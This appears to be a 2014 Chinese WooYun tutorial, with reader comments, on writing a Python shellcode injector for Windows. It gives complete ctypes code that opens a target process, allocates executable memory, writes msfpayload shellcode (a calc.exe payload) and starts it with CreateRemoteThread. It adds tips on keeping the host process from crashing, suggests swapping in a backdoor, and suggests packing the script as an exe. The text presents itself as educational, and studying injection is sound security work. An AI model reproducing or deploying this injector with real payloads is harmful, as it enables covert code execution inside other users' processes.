@@ -1,0 +1,59 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Python编写shellcode注入程序</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">light</a> <span class="bull">·</span> <time title="2014/12/29 11:57" ui-time="" datetime="2014/12/29 11:57" class="published ng-binding ng-isolate-scope">2014/12/29 11:57</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 背景</h1><hr><p>本文为《小学生科普系列》的番外篇，本系列面向小学生，纯科普，大牛莫喷~</p><p>教程中所有内容仅供学习研究，请勿用于非法用途，否则....我也帮不了你啊...</p><p>说起注入，大家第一印象可能还习惯性的停留在sql注入，脚本注入（XSS）等。今天light同(jiao)学(shou)带大家从web端回到操作系统，一起探讨Windows下的经典注入——内存注入，使用python编写一个简单的代码注入程序。</p><p>内存注入常见的方法有dll注入和代码注入。Dll注入通俗地讲就是把我们自己的dll注入到目标进程的地址空间内，“寄生”在目标进程里执行。Dll注入需要另外一个“推进器”程序将我们的“寄生虫”dll“注”进目标进程中。</p><p>代码注入和dll注入的思路一致，只是“寄生虫”代码与“推进器”代码在同一个程序里面。</p><p>Dll文件:windows动态链接库。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。</p><p>这次我们的实验选取“代码注入”这一课题。废话不多说，开始动手！</p><h1>0x01 准备工作</h1><hr><p>写python的小程序，light同学推荐性感的Sublime text2 +JEDI（python自动补全插件）。</p><p>首先安装sublime text2的“插件管理”插件package control：</p><p>打开sublime后，组合键“ctrl+~”调出控制台，将以下代码粘贴进命令行中并回车：</p><pre><code>#!python
+import urllib2,os;pf='Package Control.sublime-package';ipp=sublime.installed_packages_path();os.makedirs(ipp) if not os.path.exists(ipp) else None;open(os.path.join(ipp,pf),'wb').write(urllib2.urlopen('http://sublime.wbond.net/'+pf.replace(' ','%20')).read())
+</code></pre><p>安装完毕后重启sublime text2，输入Ctrl + Shift + P 然后输入Install Package</p><p><img alt="enter image description here" img-src="880b6fc8e846f242d92e3ebfd88f86b60780f36f.jpg"></p><p>然后输入“jedi”，回车安装。</p><p><img alt="enter image description here" img-src="39282efb90f84555868946858f8d080608ded900.jpg"></p><p>磨刀不误砍柴工，装好插件，我们开始正式撸代码。</p><h1>0x02 烹饪开始</h1><hr><p>原料：win7、python27、sublime text2、msfpayload</p><p>必备技能：windows api 基础、python基础、metasploit基础（这个还不会的赶快去这里补习！http://zone.wooyun.org/content/17377）</p><p>这次的注入代码主要借助了python的ctypes库，这个库使得python可以直接调用windows API，非常方便。“为什么不用c或者c++？”，因为我手头边只有一本《gray hat python》。</p><pre><code>#!python
+#-*- coding:utf-8 -*-
+#导入sys库以及ctypes库
+import sys
+from ctypes import *
+
+PAGE_EXECUTE_READWRITE  =  0x00000040
+PROCESS_ALL_ACCESS  =  ( 0x000F0000 | 0x00100000 | 0xFFF )
+VIRTUAL_MEM  =  ( 0x1000 | 0x2000 )
+
+kernel32  =  windll.kernel32
+pid  =  int(sys.argv[1])
+
+if not sys.argv[1]:
+    print "Code Injector: ./code_injector.py &lt;PID to inject&gt;"
+    sys.exit(0)
+
+# shellcode使用msfpayload生成的，我这里是一个计算器，当然你可以直接生成一个后门程# 序。生成代码：msfpayload  windows/exec  CMD = calc.exe  EXITFUNC=thread  C　
+shellcode = ("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
+"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
+"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
+"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
+"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
+"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
+"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
+"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00"
+"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xaa\xc5\xe2\x5d"
+"\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
+"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63"
+"\x2e\x65\x78\x65\x00")
+
+code_size = len(shellcode)
+
+# 获取我们要注入的进程句柄
+h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
+
+if not h_process:
+    print "[*] Couldn't acquire a handle to PID: %s" % pid
+    sys.exit(0)
+
+# 为我们的shellcode申请内存
+arg_address = kernel32.VirtualAllocEx( h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
+
+# 在内存中写入shellcode
+written = c_int(0)
+kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))
+
+# 创建远程线程，指定入口为我们的shellcode头部
+thread_id = c_ulong(0)
+if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)):
+    print "[*] Failed to inject shellcode. Exiting."
+sys.exit(0)
+
+print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value
+</code></pre><p>句柄：句柄与普通指针的区别在于，指针包含的是引用对象的内存地址，而句柄则是由系统所管理的引用标识，该标识可以被系统重新定位到一个内存地址上。这种间接访问对象的模式增强了系统对引用对象的控制。</p><p>可以看到，之所以能进行内存注入，主要归功于windows开放的一个关键api：CreateRemoteThread。这个函数允许我们创建一个在其它进程地址空间中运行的线程(也称：创建远程线程)。</p><p>而整个注入过程可以划分为三个步骤：获取目标进程句柄，把shellcode写入内存，创建远程线程。这也是内存注入的基本原理和机制。</p><p>在使用msfpayload生成shellcode时，有两个坑需要大家注意。</p><p>坑一： Msfpayload生成shellcode时，不能使用msfencode，有些资料告诉我们生成shellcode时要在后面加上 msfencode -b ‘\x00’ 来避免空字，但是msfencode一旦使用，默认就会使用 x86/shikata&#95;ga&#95;nai 等编码器对shellcode编码一次。这里light同学推荐大家用 msfpayload xxx C的方式来生成纯净的shellcode。</p><p>坑二：</p><p>msfpayload windows/exec CMD = calc.exe C</p><p>直接生成的shellcode执行结果是宿主100%崩溃，简直就是进程杀手。我在测试过程中，把用来测试的百度云管家崩的天昏地暗。这个坑花了好久才跳出来。</p><p>后来号基友用ollydbg调试发现shellcode退出时直接exit process，把整个进程都结束了。</p><p><img alt="enter image description here" img-src="7980f9215e5aea73846709d5d523fa5e04ed41f4.jpg"></p><p>在基友热心帮助下，再参考msfpayload官方文档后顿悟，果断修改EXITFUNC的值为thread（默认为process）：</p><p><img alt="enter image description here" img-src="729dcda4b394cef05bb1e8b88b6b2afa97ac5c17.jpg"></p><p>测试成功！</p><p><img alt="enter image description here" img-src="dcaab6e3db9508a19ba27f254b9c3cc68ac49b19.jpg"></p><p>最后，我们可以把这个python脚本用py2exe打包成exe可执行文件。有兴趣的话还可以加上UI，做成一个可以定制不同注入类型（dll或代码注入）、注入代码（反向后门或恶作剧程序）的程序。</p><p>任何问题或者好的建议请骚扰：<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="43312c2c3703722a242b376d202c">[email&#160;protected]</a></p><p>参考文档：</p><p>《gray hat python》</p><p>http://www.offensive-security.com/metasploit-unleashed/Msfpayload</p><p>http://www.google.com</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lack</span> <span class="reply-time">2015-05-15 11:49:54</span></div><p></p><p>非常好。头像是东京事变的一个专辑封面。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xFrank</span> <span class="reply-time">2015-03-18 10:03:27</span></div><p></p><p>厉害啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">大亮</span> <span class="reply-time">2015-01-28 14:45:23</span></div><p></p><p>A:我发现light这个黑阔确实有两下子。<br>B:从哪里看出来的。<br>A:头像比较漂亮</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">her0ma</span> <span class="reply-time">2015-01-15 11:51:00</span></div><p></p><p>楼主辛苦了，赞个！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Malayke</span> <span class="reply-time">2015-01-06 17:12:11</span></div><p></p><p>学习了，感谢楼主！！<br>越来越觉得python很强大~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-01-03 23:24:09</span></div><p></p><p>答:你这个观点是片面的.</p><p>1.从国情出发....</p><p>2.....</p><p>3.....</p><p>4.....</p><p>初中政治学的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-01-03 23:20:53</span></div><p></p><p>http://hi.baidu.com/abcfuck/item/ffe3f5f1ea2ddc44c9f337d3</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">溯溪</span> <span class="reply-time">2014-12-30 10:58:09</span></div><p></p><p>你如果能让各种杀软都崩一遍就可以赚大钱咯</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">棋</span> <span class="reply-time">2014-12-29 19:24:28</span></div><p></p><p>学习了，关注网络安全。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Helen</span> <span class="reply-time">2014-12-29 19:05:38</span></div><p></p><p>利用PYTHON注入shellcode，国外文章一大把。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">毛猴</span> <span class="reply-time">2014-12-29 14:39:44</span></div><p></p><p>学习了</p><p></p></div></div></div></div></div></main>
